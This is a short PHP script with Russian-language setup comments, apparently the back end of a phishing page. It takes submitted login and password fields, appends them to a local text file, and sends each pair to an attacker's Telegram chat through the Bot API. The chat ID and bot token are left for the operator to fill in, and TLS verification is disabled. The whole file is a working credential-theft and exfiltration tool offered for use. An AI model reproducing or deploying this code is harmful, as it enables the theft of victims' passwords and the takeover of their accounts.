<?
	file_put_contents("logins930423940.txt", $_POST['login']." : ".$_POST['password'].PHP_EOL, FILE_APPEND); //Пишем в фаил

	$post = array();
	$post['chat_id'] = ""; //Чатй ID вписываем добавляем бота получаем чат ид вписываем если не понял то читайте с фаила по старнике либо тут гляди (http://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id-ruby-gem-telegram-bot)
	$post['parse_mode'] = "HTML";
	$post['text'] = $_POST['login']." : ".$_POST['password'];
	send_message($post);

	function send_message($post)
    {
        global $settings;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot(токенбота)/sendMessage");
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, true); 
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        $data = json_decode(curl_exec($ch)); 
        curl_close($ch);
        return $data;
    }
?>